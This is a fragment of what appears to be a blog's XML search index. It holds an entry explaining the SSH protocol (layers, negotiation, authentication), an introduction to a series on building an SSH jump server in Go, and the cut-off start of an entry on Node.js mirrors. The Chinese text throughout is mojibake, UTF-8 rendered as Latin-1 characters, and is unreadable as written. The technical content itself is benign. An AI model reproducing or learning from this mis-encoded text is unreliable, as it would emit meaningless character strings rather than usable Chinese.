SSH-2é€šè¿‡MD5å’ŒSHA-1å®žçŽ°è¯¥åŠŸèƒ½ï¼ŒSSH-1ä½¿ç”¨CRC-32 è®¤è¯: è¯†åˆ«æ•°æ®å‘é€è€…å’ŒæŽ¥æ”¶è€…èº«ä»½ å®¢æˆ·ç«¯éªŒè¯SSHæœåŠ¡ç«¯çš„èº«ä»½ï¼šé˜²æ­¢æ”»å‡»è€…ä»¿å†’SSHæœåŠ¡ç«¯èº«ä»½ï¼Œé¿å…ä¸­ä»‹äººæ”»å‡»å’Œé‡å®šå‘è¯·æ±‚çš„æ”»å‡»ï¼›OpenSSHé€šè¿‡åœ¨know-hostsä¸­å­˜å‚¨ä¸»æœºåå’Œhost keyå¯¹æœåŠ¡ç«¯èº«ä»½è¿›è¡Œè®¤è¯ æœåŠ¡ç«¯éªŒè¯è¯·æ±‚è€…èº«ä»½ï¼šæä¾›å®‰å…¨æ€§è¾ƒå¼±çš„ç”¨æˆ·å¯†ç æ–¹å¼ï¼Œå’Œå®‰å…¨æ€§æ›´å¼ºçš„per-user public-key signaturesï¼›æ­¤å¤–SSHè¿˜æ”¯æŒä¸Žç¬¬ä¸‰æ–¹å®‰å…¨æœåŠ¡ç³»ç»Ÿçš„é›†æˆï¼Œå¦‚Kerberosç­‰ æŽˆæƒ: ç”¨æˆ·è®¿é—®æŽ§åˆ¶ å®‰å…¨éš§é“: è½¬å‘æˆ–è€…ä¸ºåŸºäºŽTCP/IPçš„å›žè¯æä¾›åŠ å¯†éš§é“, æ¯”å¦‚é€šè¿‡SSHä¸ºTelnetã€FTPç­‰æä¾›é€šä¿¡å®‰å…¨ä¿éšœï¼Œæ”¯æŒä¸‰ç§ç±»åž‹çš„Forwardingæ“ä½œï¼šPort Forwardingï¼›X Forwardingï¼›Agent Forwarding é€šè¿‡ä½¿ç”¨SSHï¼Œä½ å¯ä»¥æŠŠæ‰€æœ‰ä¼ è¾“çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œè¿™æ ·â€ä¸­é—´äººâ€è¿™ç§æ”»å‡»æ–¹å¼å°±ä¸å¯èƒ½å®žçŽ°äº†ï¼Œè€Œä¸”ä¹Ÿèƒ½å¤Ÿé˜²æ­¢DNSæ¬ºéª—å’ŒIPæ¬ºéª—ã€‚ä½¿ç”¨SSHï¼Œè¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„å¥½å¤„å°±æ˜¯ä¼ è¾“çš„æ•°æ®æ˜¯ç»è¿‡åŽ‹ç¼©çš„ï¼Œæ‰€ä»¥å¯ä»¥åŠ å¿«ä¼ è¾“çš„é€Ÿåº¦ã€‚SSHæœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œå®ƒæ—¢å¯ä»¥ä»£æ›¿Telnetï¼Œåˆå¯ä»¥ä¸ºFTPã€PoPã€ç”šè‡³ä¸ºPPPæä¾›ä¸€ä¸ªå®‰å…¨çš„â€é€šé“â€ã€‚ å®‰å…¨ç›¸å…³åœ¨SSHä¸­æ¶‰åŠåˆ°å¾ˆå¤šåŠ å¯†ç®—æ³•, å…³äºŽåŠ å¯†ç®—æ³•çš„ç›¸å…³çŸ¥è¯†ä¹‹å‰å·²ç»å†™è¿‡ä¸€éåšå®¢åšä¸“é—¨ä»‹ç»:å¯†ç å­¦ç®€ä»‹ä¸ŽGolangçš„åŠ å¯†åº“Cryptoçš„ä½¿ç”¨, ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ€»ç»“æ€§çš„æè¿°: å¯¹ç§°åŠ å¯†: é«˜æ•ˆï¼Œä½†å®‰å…¨æ€§ç›¸å¯¹è¾ƒä½Žï¼ŒKeyçš„åˆ†å‘å°¤å…¶ä¸æ–¹ä¾¿, ä¸»è¦ç”¨äºŽæ•°æ®ä¼ è¾“çš„åŠ å¯†(sessionåŠ å¯†), å¸¸ç”¨AESç³»åˆ— éžå¯¹ç§°åŠ å¯†: å®‰å…¨ï¼Œä½†æ•ˆçŽ‡ä½Žï¼Œä¸é€‚åˆå¤§è§„æ¨¡è¿›è¡Œæ•°æ®çš„åŠ å¯†å’Œè§£å¯†æ“ä½œ, ä¸»è¦ç”¨äºŽç§˜é’¥äº¤æ¢ç®—æ³•è¿‡ç¨‹ä¸­ç”¨æ¥åå•†Keyå’Œåœ¨æ•°å­—ç­¾åæ—¶ç”¨æ¥éªŒè¯èº«ä»½, å¸¸ç”¨çš„æ˜¯RSA/ECDSA ç§˜é’¥äº¤æ¢ç®—æ³•: ç”¨äºŽåå•†å¯¹ç§°åŠ å¯†çš„å¯†ç , ECDHç”¨çš„æ¯”è¾ƒå¤š æ•£åˆ—ç®—æ³•: ç”¨äºŽç¡®ä¿æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­çš„å®Œæ•´æ€§, ä¸ºäº†å®‰å…¨ä¸€èˆ¬ä½¿ç”¨Hmacåœ¨golangçš„sshåŒ…ä¸­ä½¿ç”¨ECDHçš„cure25519çš„è¿›è¡Œå¯†ç çš„äº¤æ¢, äº¤æ¢åŽçš„å¯†ç ä½¿ç”¨AESæ¥åŠ å¯†æ•°æ®. å¦‚æžœä½¿ç”¨å¯†é’¥ç™»å½•çš„è¯,ä¸€èˆ¬ä½¿ç”¨ECDSAè¿›è¡Œæ•°å­—ç­¾å. åè®®ç»„æˆä»Žä¸Šå›¾ä¸­å¯ä»¥çœ‹å‡ºSSHä¸»è¦æœ‰ä¸‰éƒ¨åˆ†ç»„æˆ: ä¼ è¾“å±‚åè®®, ç”¨æˆ·è®¤è¯åè®®, è¿žæŽ¥åè®® ä¼ è¾“å±‚åè®®[SSH-TRANS]ä¹Ÿå«:The Transport Layer Protocol, æä¾›äº†æœåŠ¡å™¨è®¤è¯ï¼Œä¿å¯†æ€§åŠå®Œæ•´æ€§ã€‚æ­¤å¤–å®ƒæœ‰æ—¶è¿˜æä¾›åŽ‹ç¼©åŠŸèƒ½ã€‚ SSH-TRANSé€šå¸¸è¿è¡Œåœ¨TCP/IPè¿žæŽ¥ä¸Šï¼Œä¹Ÿå¯èƒ½ç”¨äºŽå…¶å®ƒå¯é æ•°æ®æµä¸Šã€‚ SSH-TRANSæä¾›äº†å¼ºåŠ›çš„åŠ å¯†æŠ€æœ¯ã€å¯†ç ä¸»æœºè®¤è¯åŠå®Œæ•´æ€§ä¿æŠ¤ã€‚è¯¥åè®®ä¸­çš„è®¤è¯åŸºäºŽä¸»æœºï¼Œå¹¶ä¸”è¯¥åè®®ä¸æ‰§è¡Œç”¨æˆ·è®¤è¯ã€‚æ›´é«˜å±‚çš„ç”¨æˆ·è®¤è¯åè®®å¯ä»¥è®¾è®¡ä¸ºåœ¨æ­¤åè®®ä¹‹ä¸Šã€‚ ç”¨æˆ·è®¤è¯åè®®[SSH-USERAUTH]ä¹Ÿå«:The User Authentication Protocol, ç”¨äºŽå‘æœåŠ¡å™¨æä¾›å®¢æˆ·ç«¯ç”¨æˆ·é‰´åˆ«åŠŸèƒ½ã€‚å®ƒè¿è¡Œåœ¨ä¼ è¾“å±‚åè®®SSH-TRANSä¸Šé¢ã€‚å½“SSH-USERAUTHå¼€å§‹åŽï¼Œå®ƒä»Žä½Žå±‚åè®®é‚£é‡ŒæŽ¥æ”¶ä¼šè¯æ ‡è¯†ç¬¦(ä»Žç¬¬ä¸€æ¬¡å¯†é’¥äº¤æ¢ä¸­çš„äº¤æ¢å“ˆå¸ŒH). ä¼šè¯æ ‡è¯†ç¬¦å”¯ä¸€æ ‡è¯†æ­¤ä¼šè¯å¹¶ä¸”é€‚ç”¨äºŽæ ‡è®°ä»¥è¯æ˜Žç§é’¥çš„æ‰€æœ‰æƒã€‚ SSH-USERAUTHä¹Ÿéœ€è¦çŸ¥é“ä½Žå±‚åè®®æ˜¯å¦æä¾›ä¿å¯†æ€§ä¿æŠ¤ã€‚ è¿žæŽ¥åè®®[SSH-CONNECT]ä¹Ÿå«: The Connection Protocol, å°†å¤šä¸ªåŠ å¯†éš§é“åˆ†æˆé€»è¾‘é€šé“ã€‚å®ƒè¿è¡Œåœ¨ç”¨æˆ·è®¤è¯åè®®ä¸Šã€‚å®ƒæä¾›äº†äº¤äº’å¼ç™»å½•è¯è·¯ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€è½¬å‘TCP/IPè¿žæŽ¥å’Œè½¬å‘X11è¿žæŽ¥ã€‚å„ç§é«˜å±‚åº”ç”¨åè®®å¯ä»¥ç›¸å¯¹åœ°ç‹¬ç«‹äºŽSSHåŸºæœ¬ä½“ç³»ä¹‹å¤–ï¼Œå¹¶ä¾é è¿™ä¸ªåŸºæœ¬æ¡†æž¶ï¼Œé€šè¿‡è¿žæŽ¥åè®®ä½¿ç”¨SSHçš„å®‰å…¨æœºåˆ¶ã€‚ å·¥ä½œè¿‡ç¨‹è¿™å¼ å›¾æè¿°äº†sshäº¤æ¢çš„æ•´ä¸ªè¿‡ç¨‹: Clientç«¯å‘Serverç«¯å‘èµ·SSHè¿žæŽ¥è¯·æ±‚ã€‚ Serverç«¯å‘Clientç«¯å‘èµ·ç‰ˆæœ¬åå•†ã€‚ åå•†ç»“æŸåŽServerç«¯å‘é€Host Keyå…¬é’¥ Server Keyå…¬é’¥ï¼Œéšæœºæ•°ç­‰ä¿¡æ¯ã€‚åˆ°è¿™é‡Œæ‰€æœ‰é€šä¿¡æ˜¯ä¸åŠ å¯†çš„ã€‚ Clientç«¯è¿”å›žç¡®è®¤ä¿¡æ¯ï¼ŒåŒæ—¶é™„å¸¦ç”¨å…¬é’¥åŠ å¯†è¿‡çš„ä¸€ä¸ªéšæœºæ•°ï¼Œç”¨äºŽåŒæ–¹è®¡ç®—Session Keyã€‚ è¿›å…¥è®¤è¯é˜¶æ®µã€‚ä»Žæ­¤ä»¥åŽæ‰€æœ‰é€šä¿¡å‡åŠ å¯†ã€‚ è®¤è¯æˆåŠŸåŽï¼Œè¿›å…¥äº¤äº’é˜¶æ®µã€‚ é’ˆå¯¹è¿™é¡¹é˜¶æ®µå‘ç”Ÿåœ¨åæˆçš„é‚£ä¸€éƒ¨åˆ†æœ‰ä¸€ä¸ªç®€å•çš„æ€»ç»“: å‘ç”Ÿåœ¨ä¼ è¾“å±‚çš„: ç‰ˆæœ¬åå•†å’Œç®—æ³•åå•†. å‘ç”Ÿåœ¨ç”¨æˆ·è®¤è¯å±‚çš„: ç”¨æˆ·è®¤è¯. å‘ç”Ÿåœ¨é“¾æŽ¥å±‚çš„: å›žè¯äº¤äº’ ç‰ˆæœ¬åå•† æœåŠ¡å™¨ç›‘å¬22ç«¯å£ï¼Œç­‰å¾…å®¢æˆ·ç«¯è¿žæŽ¥ã€‚ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘èµ·TCPåˆå§‹è¿žæŽ¥è¯·æ±‚ï¼ŒTCPè¿žæŽ¥å»ºç«‹åŽï¼ŒæœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€ç¬¬ä¸€ä¸ªæŠ¥æ–‡ï¼ŒåŒ…æ‹¬ç‰ˆæœ¬æ ‡å¿—å­—ç¬¦ä¸²ï¼Œæ ¼å¼ä¸ºâ€œSSHï¼&lt;ä¸»åè®®ç‰ˆæœ¬å·&gt;.&lt;æ¬¡åè®®ç‰ˆæœ¬å·&gt;ï¼&lt;è½¯ä»¶ç‰ˆæœ¬å·&gt;â€ï¼Œåè®®ç‰ˆæœ¬å·ç”±ä¸»ç‰ˆæœ¬å·å’Œæ¬¡ç‰ˆæœ¬å·ç»„æˆï¼Œè½¯ä»¶ç‰ˆæœ¬å·ä¸»è¦æ˜¯ä¸ºè°ƒè¯•ä½¿ç”¨ã€‚ å®¢æˆ·ç«¯æ”¶åˆ°æŠ¥æ–‡åŽï¼Œè§£æžè¯¥æ•°æ®åŒ…ï¼Œå¦‚æžœæœåŠ¡å™¨ç«¯çš„åè®®ç‰ˆæœ¬å·æ¯”è‡ªå·±çš„ä½Žï¼Œä¸”å®¢æˆ·ç«¯èƒ½æ”¯æŒæœåŠ¡å™¨ç«¯çš„ä½Žç‰ˆæœ¬ï¼Œå°±ä½¿ç”¨æœåŠ¡å™¨ç«¯çš„ä½Žç‰ˆæœ¬åè®®å·ï¼Œå¦åˆ™ä½¿ç”¨è‡ªå·±çš„åè®®ç‰ˆæœ¬å·ã€‚ å®¢æˆ·ç«¯å›žåº”æœåŠ¡å™¨ä¸€ä¸ªæŠ¥æ–‡ï¼ŒåŒ…å«äº†å®¢æˆ·ç«¯å†³å®šä½¿ç”¨çš„åè®®ç‰ˆæœ¬å·ã€‚æœåŠ¡å™¨æ¯”è¾ƒå®¢æˆ·ç«¯å‘æ¥çš„ç‰ˆæœ¬å·ï¼Œå†³å®šæ˜¯å¦èƒ½åŒå®¢æˆ·ç«¯ä¸€èµ·å·¥ä½œã€‚ å¦‚æžœåå•†æˆåŠŸï¼Œåˆ™è¿›å…¥å¯†é’¥å’Œç®—æ³•åå•†é˜¶æ®µï¼Œå¦åˆ™æœåŠ¡å™¨ç«¯æ–­å¼€TCPè¿žæŽ¥ã€‚ å› ä¸ºç‰ˆæœ¬åå•†å‘ç”Ÿåœ¨ä¸ºåŠ å¯†ä¹‹å‰, æ‰€ä»¥ç‰ˆæœ¬åå•†æ˜¯æ˜Žæ–‡çš„ ç®—æ³•åå•† æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯åˆ†åˆ«å‘é€ç®—æ³•åå•†æŠ¥æ–‡ç»™å¯¹ç«¯ï¼ŒæŠ¥æ–‡ä¸­åŒ…å«è‡ªå·±æ”¯æŒçš„å…¬é’¥ç®—æ³•åˆ—è¡¨ã€åŠ å¯†ç®—æ³•åˆ—è¡¨ã€MAC(Message Authentication Codeï¼Œæ¶ˆæ¯éªŒè¯ç )ç®—æ³•åˆ—è¡¨ã€åŽ‹ç¼©ç®—æ³•åˆ—è¡¨ç­‰; æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯æ ¹æ®å¯¹ç«¯å’Œæœ¬ç«¯æ”¯æŒçš„ç®—æ³•åˆ—è¡¨å¾—å‡ºæœ€ç»ˆä½¿ç”¨çš„ç®—æ³•ã€‚ æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯åˆ©ç”¨ECDHäº¤æ¢ç®—æ³•ã€ä¸»æœºå¯†é’¥å¯¹ç­‰å‚æ•°ï¼Œç”Ÿæˆä¼šè¯å¯†é’¥å’Œä¼šè¯IDã€‚ é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼ŒæœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯å°±å–å¾—äº†ç›¸åŒçš„ä¼šè¯å¯†é’¥å’Œä¼šè¯ID, ç”¨äºŽåŠ å¯†ä¼ è¾“çš„æ•°æ®, åˆ°æ­¤é“¾æŽ¥åŠ å¯†å®Œæˆã€‚ ç”¨æˆ·è®¤è¯ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€è®¤è¯è¯·æ±‚ï¼Œè®¤è¯è¯·æ±‚ä¸­åŒ…å«ç”¨æˆ·åã€è®¤è¯æ–¹æ³•ã€ä¸Žè¯¥è®¤è¯æ–¹æ³•ç›¸å…³çš„å†…å®¹ï¼ˆå¦‚ï¼špasswordè®¤è¯æ—¶ï¼Œå†…å®¹ä¸ºå¯†ç ï¼‰ã€‚ æœåŠ¡å™¨ç«¯å¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯ï¼Œå¦‚æžœè®¤è¯å¤±è´¥ï¼Œåˆ™å‘å®¢æˆ·ç«¯å‘é€è®¤è¯å¤±è´¥æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥å†æ¬¡è®¤è¯çš„æ–¹æ³•åˆ—è¡¨ã€‚ å®¢æˆ·ç«¯ä»Žè®¤è¯æ–¹æ³•åˆ—è¡¨ä¸­é€‰å–ä¸€ç§è®¤è¯æ–¹æ³•å†æ¬¡è¿›è¡Œè®¤è¯ã€‚ è¯¥è¿‡ç¨‹åå¤è¿›è¡Œï¼Œ ç›´åˆ°è®¤è¯æˆåŠŸæˆ–è€…è®¤è¯æ¬¡æ•°è¾¾åˆ°ä¸Šé™ï¼Œ æœåŠ¡å™¨å…³é—­è¿žæŽ¥ä¸ºæ­¢ã€‚ ç”¨æˆ·è®¤è¯æ˜¯åœ¨åŠ å¯†è¿‡ä¼šè¿›è¡Œçš„, æ‰€ä»¥ç”¨äºŽè®¤è¯çš„æ•°æ®æ˜¯ä¸ä¼šæš´éœ²çš„,é€šå¸¸è€Œè¨€SSHæä¾›2è®¤è¯æ–¹å¼: passwordè®¤è¯ï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘å‡º passwordè®¤è¯è¯·æ±‚ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç åŠ å¯†åŽå‘é€ç»™æœåŠ¡å™¨ï¼›æœåŠ¡å™¨å°†è¯¥ä¿¡æ¯è§£å¯†åŽå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç çš„æ˜Žæ–‡ï¼Œä¸Žè®¾å¤‡ä¸Šä¿å­˜çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶è¿”å›žè®¤è¯æˆåŠŸæˆ–å¤±è´¥çš„æ¶ˆæ¯ã€‚ publickey è®¤è¯ï¼šé‡‡ç”¨æ•°å­—ç­¾åçš„æ–¹æ³•æ¥è®¤è¯å®¢æˆ·ç«¯ã€‚ç›®å‰ï¼Œè®¾å¤‡ä¸Šå¯ä»¥åˆ©ç”¨RSAå’Œ DSAä¸¤ç§å…¬å…±å¯†é’¥ç®—æ³•å®žçŽ°æ•°å­—ç­¾åã€‚å®¢æˆ·ç«¯å‘é€åŒ…å«ç”¨æˆ·åã€å…¬å…±å¯†é’¥å’Œå…¬å…±å¯†é’¥ç®—æ³•çš„ publickey è®¤è¯è¯·æ±‚ç»™æœåŠ¡å™¨ç«¯ã€‚æœåŠ¡å™¨å¯¹å…¬é’¥è¿›è¡Œåˆæ³•æ€§æ£€æŸ¥ï¼Œå¦‚æžœä¸åˆæ³•ï¼Œåˆ™ç›´æŽ¥å‘é€å¤±è´¥æ¶ˆæ¯ï¼›å¦åˆ™ï¼ŒæœåŠ¡å™¨åˆ©ç”¨æ•°å­—ç­¾åå¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯ï¼Œå¹¶è¿”å›žè®¤è¯æˆåŠŸæˆ–å¤±è´¥çš„æ¶ˆæ¯SSH2.0è¿˜æä¾›äº† password-publickey è®¤è¯å’Œ any è®¤è¯: password-publickey è®¤è¯ï¼šæŒ‡å®šè¯¥ç”¨æˆ·çš„è®¤è¯æ–¹å¼ä¸º password å’Œ publickeyè®¤è¯åŒæ—¶æ»¡è¶³ã€‚å®¢æˆ·ç«¯ç‰ˆæœ¬ä¸º SSH1çš„ç”¨æˆ·åªè¦é€šè¿‡å…¶ä¸­ä¸€ç§è®¤è¯å³å¯ç™»å½•ï¼›å®¢æˆ·ç«¯ç‰ˆæœ¬ä¸º SSH2çš„ç”¨æˆ·å¿…é¡»ä¸¤ç§è®¤è¯éƒ½é€šè¿‡æ‰èƒ½ç™»å½•ã€‚ anyè®¤è¯ï¼šæŒ‡å®šè¯¥ç”¨æˆ·çš„è®¤è¯æ–¹å¼å¯ä»¥æ˜¯ passwordï¼Œä¹Ÿå¯ä»¥æ˜¯ publickeyã€‚ ä¸€èˆ¬è€Œè¨€é»˜è®¤ä½¿ç”¨çš„anyã€‚è¿™å¼ å›¾æè¿°äº†åœ¨åŠ å¯†è¿‡ç¨‹ä¸Šçš„è®¤è¯: ä¼šè¯äº¤äº’ä¼šè¯è¯·æ±‚é˜¶æ®µï¼š æœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼› è®¤è¯é€šè¿‡åŽï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¼šè¯è¯·æ±‚ï¼› æœåŠ¡å™¨å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚è¯·æ±‚è¢«æˆåŠŸå¤„ç†åŽï¼Œ æœåŠ¡å™¨ä¼šå‘å®¢æˆ·ç«¯å›žåº” SSH_SMSG_SUCCESSåŒ…ï¼ŒSSHè¿›å…¥äº¤äº’ä¼šè¯é˜¶æ®µï¼›å¦åˆ™å›žåº” SSH_SMSG_FAILUREåŒ…ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å¤„ç†è¯·æ±‚å¤±è´¥æˆ–è€…ä¸èƒ½è¯†åˆ«è¯·æ±‚ã€‚ äº¤äº’ä¼šè¯é˜¶æ®µï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œæ•°æ®è¢«åŒå‘ä¼ é€: å®¢æˆ·ç«¯å°†è¦æ‰§è¡Œçš„å‘½ä»¤åŠ å¯†åŽä¼ ç»™æœåŠ¡å™¨; æœåŠ¡å™¨æŽ¥æ”¶åˆ°æŠ¥æ–‡ï¼Œè§£å¯†åŽæ‰§è¡Œè¯¥å‘½ä»¤,å°†æ‰§è¡Œçš„ç»“æžœåŠ å¯†å‘è¿˜ç»™å®¢æˆ·ç«¯; å®¢æˆ·ç«¯å°†æŽ¥æ”¶åˆ°çš„ç»“æžœè§£å¯†åŽæ˜¾ç¤ºåˆ°ç»ˆç«¯ä¸Š.]]></content>
      <categories>
        <category>åè®®è¯¦è§£</category>
        <category>ssh</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·³æ¿æœºç³»åˆ—(ä¸€)-æž¶æž„ä¸Žç®€ä»‹]]></title>
    <url>%2F2017%2F02%2F15%2Fgo-ssh%2F</url>
    <content type="text"><![CDATA[ä¸€ç›´å‚ä¸ŽJumpServerçš„å¼€å‘, ä¹Ÿä¸€ç›´åœ¨æƒ³å¦‚ä½•è®¾è®¡ä¸€ä¸ªç›¸å¯¹å®Œç¾Žçš„è·³æ¿æœº, è·³æ¿æœºçš„æœ¬è´¨æ˜¯sshåè®®çš„åå‘ä»£ç†(ä¸»è¦è¿˜æ˜¯ssh, è‡³äºŽrdpè¿˜æ²¡æƒ³è¿‡), è™½ç„¶ä¹Ÿç»å¸¸ä½¿ç”¨ssh(åšè¿ç»´çš„æ—¶å€™è¿˜ä¸“é—¨å°±sshå­¦ä¹ è¿‡), ä½†ä¹Ÿä»…ä»…æ˜¯sshå®¢æˆ·ç«¯çš„ä½¿ç”¨ä»¥åŠæœåŠ¡ç«¯çš„é…ç½®, æˆ‘è§‰å¾—ä¸€ä¸ªå®Œç¾Žçš„è·³æ¿æœºåº”è¯¥æ˜¯ä»Žåè®®å±‚é¢è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å› æ­¤æ‰“ç®—ä»¥Golangä¸ºå¼€å‘è¯­è¨€(å› ä¸ºsshåº“å®Œå–„ï¼Œwebsocketç¼–å†™ç®€å•),å¼€å‘ä¸€ä¸ªæœ‰åŸºæœ¬åŠŸèƒ½çš„è·³æ¿æœºã€‚ æ¦‚è¿°è¿™ä¸€ç³»åˆ—çš„åšå®¢ åŒ…å«å¾ˆå¤šç¯‡, ä¸»è¦ç›®çš„æ˜¯: åœ¨ä¹‹å‰çš„ç»éªŒä¸Š, æŠŠå¼€å‘è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ‰€æœ‰çŸ¥è¯†å’Œæ„Ÿæƒ³è®°å½•ä¸‹æ¥(å½“ç„¶åŒ…å«æºç ), è¿™ä¸€ç³»åˆ—æ¶‰åŠå¦‚ä¸‹æ–‡ç« , ç”±æµ…å…¥æ·±, å¾ªåºæ¸è¿›çš„ä»‹ç»å¼€å‘è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„å„ç§çŸ¥è¯†: è·³æ¿æœºç³»åˆ—(ä¸€)-æž¶æž„ä¸Žç®€ä»‹ è·³æ¿æœºç³»åˆ—(äºŒ)-sshåè®®åŽŸç†ç®€ä»‹ è·³æ¿æœºç³»åˆ—(ä¸‰)-Golangä¸­SSHå®¢æˆ·ç«¯çš„å®žçŽ° ç®€å•æž¶æž„ä¹‹å‰JumpServerçš„æ ¸å¿ƒæ˜¯æŒ‰ç…§ç®€å•çš„æž¶æž„æ¥å¼€å‘çš„, ä¸€ä¸ªç®€å•çš„æž¶æž„å…¶å®žå·²ç»æœ‰å¾ˆå¤šä¸é”™çš„demoæˆ–è€…äº§å“äº†, æ¯”å¦‚è¿™ä¸ªé¡¹ç›®webconsole, å½“ç„¶ä»–ä¸å®Œæ•´ä»…ä»…å®žçŽ°äº†webï¼Œè‡³äºŽå‘½ä»¤è¡Œå¹¶æ²¡æœ‰å®žçŽ°, è€Œjumpserverè¿™2ä¸ªéƒ½å®žçŽ°äº†ã€‚ä¸ºä»€ä¹ˆç§°ä¹‹ä¸ºç®€å•çš„æž¶æž„, å› ä¸ºä»–çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯: å°±æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªç»ˆç«¯(webç«¯çš„xtermè¿™ä¸ªjsåº“å°±æ˜¯å¹²è¿™ä¸ªäº‹å„¿çš„, è€Œå‘½ä»¤è¡ŒåŒæ ·æ¨¡æ‹Ÿä¸€ä¸ªç»ˆç«¯å°±è¡Œäº†, æ¯”å¦‚golangçš„ssh/terminalè¿™ä¸ªåº“å°±å¯ä»¥å®Œæˆè¿™ä¸ªäº‹å„¿),ç„¶åŽé€šè¿‡ä¸€ä¸ªssh agentè®¿é—®åŽé¢çš„çœŸå®žçš„æœåŠ¡å™¨ï¼Œèµ·åˆ°ä¸€ä¸ªä»£ç†è½¬å‘çš„ä½œç”¨ã€‚ è¿™ç§æ¨¡å¼çš„ç¼ºé™·ä¸»è¦ä½“çŽ°åœ¨å‘½ä»¤è¡Œç»ˆç«¯ä¸Šé¢, å› ä¸ºæ­¤æ—¶ç»ˆç«¯åŽé¢æŽ¥çš„å°±æ˜¯sshå®¢æˆ·ç«¯, å› æ­¤è¿™ä¸ªç»ˆç«¯æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯å’Œè·³æ¿æœºç»‘å®šåœ¨ä¸€èµ·äº†, ç”¨æˆ·åªæœ‰å…ˆç™»å½•è·³æ¿æœºæ‰èƒ½ä½¿ç”¨ä»£ç†æœåŠ¡, è€Œè¿™æ˜¾ç„¶æ˜¯ä¸åˆç†çš„,Jumpserveråœ¨æ­¤ä¸Šè¿›è¡Œäº†æ”¹è¿›, é€šè¿‡å†æ·»åŠ ä¸€ä¸ªssh serverç›‘å¬, å®žé™…ä¸Šå°±æ˜¯ssh-in-sshã€‚ æž¶æž„æ”¹è¿›æ”¹è¿›è¿‡åŽä¸»è¦åŠ å…¥ä¸€ä¸ªsshçš„ä»£ç†æœåŠ¡,ç»Ÿä¸€ä»£ç†å±‚, æŠ½ç¦»å®¢æˆ·ç«¯ã€‚ å®Œç¾Žæž¶æž„ä¸ªäººæž¶æž„çš„èƒ½åŠ›è¿˜æ˜¯å¾ˆèœçš„, å¯¹sshåè®®çš„ç†è§£ä¹Ÿä¸æ·±, å½“çœ‹åˆ°teleportè¿™ä¸ªå¼€æºäº§å“çš„è®¾è®¡æ—¶, å®Œå…¨è¢«æƒŠå‘†äº†ã€‚ è¿™ä¸å°±æ˜¯æˆ‘æƒ³è¦çš„æž¶æž„å˜›, è€Œä¸”ç»†èŠ‚æ˜¯åšçš„é‚£ä¹ˆçš„æ¼‚äº®ã€‚åŽæœŸå¦‚æžœæœ‰æ—¶é—´çš„è¯, æ‰“ç®—å†™ä¸€ä¸ªå…³äºŽteleportæºç è§£è¯»çš„ç³»åˆ—, ä¸€ç‚¹ä¸€ä¸ªå‰–æžè¿™ä¸ªå®Œç¾Žæž¶æž„çš„å®žçŽ°ã€‚ æ€»ç»“å†™è¿™ä¸€ä¸ªç³»åˆ—ä¸å®¹æ˜“, è¿™æ˜¯ä¸€ä¸ªå¼€ç¯‡å’Œè§„åˆ’ï¼Œå¸Œæœ›æœ€åŽèƒ½å®Œç¾Žçš„æ”¶å°¾ï¼Œæœ‰ä¸€ä¸ªä¸é”™çš„demoå±•ç¤ºç»™å¤§å®¶ã€‚çŽ°åœ¨çœ‹æ¥teleportå·²ç»å¾ˆå®Œå–„äº†, ä¹Ÿç¬¦åˆæˆ‘å¿ƒç›®ä¸­çš„è·³æ¿æœºçš„æ ·å­, ç­‰è¯»å®Œteleportæºç è¿‡åŽ, çœ‹å…¶æ˜¯å¦å®Œå–„, æ‰©å±•æ˜¯å¦æ–¹ä¾¿, å› æ­¤å¾ˆæœ‰å¯èƒ½æ˜¯å®Œå–„teleport,è€Œä¸æ˜¯ä»Žå¤´å¼€å§‹ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodejsæºåŠ é€Ÿ]]></title>
    <url>%2F2017%2F02%2F14%2Fnodejs-accelerate%2F</url>
